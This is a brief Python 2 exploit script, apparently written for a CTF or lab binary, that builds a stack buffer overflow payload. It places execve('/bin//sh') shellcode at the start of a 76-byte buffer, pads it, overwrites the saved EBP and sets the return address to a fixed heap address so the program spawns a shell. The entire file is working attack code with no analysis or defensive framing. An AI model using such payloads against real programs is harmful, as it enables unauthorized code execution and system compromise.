#!/usr/bin/env python2

import struct
import sys

# Try preserving EBP and being more careful with stack
shellcode = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"

heap_addr = 0x804a008

# Build payload more carefully
# Buffer: 76 bytes (we found buffer was to -0x4c from ebp = 76 bytes)
# Saved EBP: 4 bytes  
# Return addr: 4 bytes

payload = shellcode  # 21 bytes
payload += "A" * (76 - len(shellcode))  # Pad to saved EBP (55 bytes)  
payload += "BBBB"  # Overwrite saved EBP (4 bytes)
payload += struct.pack("<L", heap_addr)  # Return address (4 bytes)

sys.stdout.write(payload)